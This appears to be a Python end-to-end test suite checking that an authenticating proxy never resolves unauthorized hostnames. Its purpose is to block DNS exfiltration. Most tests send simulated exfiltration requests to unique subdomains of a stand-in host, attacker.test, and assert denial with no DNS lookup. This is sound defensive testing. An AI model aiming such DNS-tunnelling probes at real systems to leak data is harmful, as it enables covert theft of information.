"""C-1: the proxy must never resolve a name it has not authorized (DNS exfiltration)."""

from tests.e2e.harness import Proxy, ProxyTestCase, connect, http_request, raw_request, tunnel, unique


class DNSExfiltrationTests(ProxyTestCase):
    @classmethod
    def setUpClass(cls) -> None:
        super().setUpClass()
        cls.proxy = Proxy(policy={"version": 1, "principals": {"demo": ["https://example.com", "http://example.com"]}},
                          users={"demo": "demo-password"}).start()
        cls.good = ("demo", "demo-password")

    @classmethod
    def tearDownClass(cls) -> None:
        cls.proxy.stop()

    def _denied_without_dns(self, label: str, status: int, expected: set[int]) -> None:
        self.assertIn(status, expected)
        self.assertNoDNS(label)

    # E-C1-01..02: no credentials
    def test_no_credentials_get(self):
        label = unique("c1-nocreds-get")
        r = http_request(self.proxy, f"http://{label}.attacker.test/", None)
        self._denied_without_dns(label, r.status, {407})

    def test_no_credentials_connect(self):
        label = unique("c1-nocreds-connect")
        status, _ = connect(self.proxy, f"{label}.attacker.test:443", None)
        self._denied_without_dns(label, status, {407})

    # E-C1-03..04: wrong password
    def test_wrong_password_get(self):
        label = unique("c1-badpw-get")
        r = http_request(self.proxy, f"http://{label}.attacker.test/", ("demo", "wrong"))
        self._denied_without_dns(label, r.status, {407})

    def test_wrong_password_connect(self):
        label = unique("c1-badpw-connect")
        status, _ = connect(self.proxy, f"{label}.attacker.test:443", ("demo", "wrong"))
        self._denied_without_dns(label, status, {407})

    # E-C1-05..06: unknown user
    def test_unknown_user(self):
        label = unique("c1-nouser")
        status, _ = connect(self.proxy, f"{label}.attacker.test:443", ("mallory", "x"))
        self._denied_without_dns(label, status, {407})

    # E-C1-07..08: authenticated but not allowed by policy
    def test_authenticated_denied_get(self):
        label = unique("c1-authed-get")
        r = http_request(self.proxy, f"http://{label}.attacker.test/", self.good)
        self._denied_without_dns(label, r.status, {403})

    def test_authenticated_denied_connect(self):
        label = unique("c1-authed-connect")
        result = tunnel(self.proxy, f"{label}.attacker.test:443", self.good)
        self.assertFalse(result.established, result)
        self.assertNoDNS(label)

    # E-C1-09: non-allowed port
    def test_disallowed_port(self):
        label = unique("c1-port")
        result = tunnel(self.proxy, f"{label}.attacker.test:8443", self.good)
        self.assertFalse(result.established, result)
        self.assertNoDNS(label)

    # E-C1-10: non-HTTP scheme
    def test_non_http_scheme(self):
        label = unique("c1-ftp")
        r = raw_request(self.proxy, (f"GET ftp://{label}.attacker.test:80/ HTTP/1.1\r\nHost: {label}.attacker.test\r\n"
                                     "Connection: close\r\n\r\n").encode())
        self._denied_without_dns(label, r.status, {403, 407})

    # E-C1-12: allowed host on the wrong port resolves nothing either
    def test_allowed_host_wrong_port(self):
        before = len(self.fx.dns.queried("example.com"))
        result = tunnel(self.proxy, "example.com:8443", self.good)
        self.assertFalse(result.established, result)
        self.assertEqual(len(self.fx.dns.queried("example.com")), before)

    # E-C1-11: positive control -- an allowed destination IS resolved and works
    def test_allowed_destination_resolves(self):
        r = http_request(self.proxy, "http://example.com/", self.good)
        self.assertEqual(r.status, 200, self.proxy.diagnostics())
        self.assertTrue(self.fx.dns.queried("example.com"))
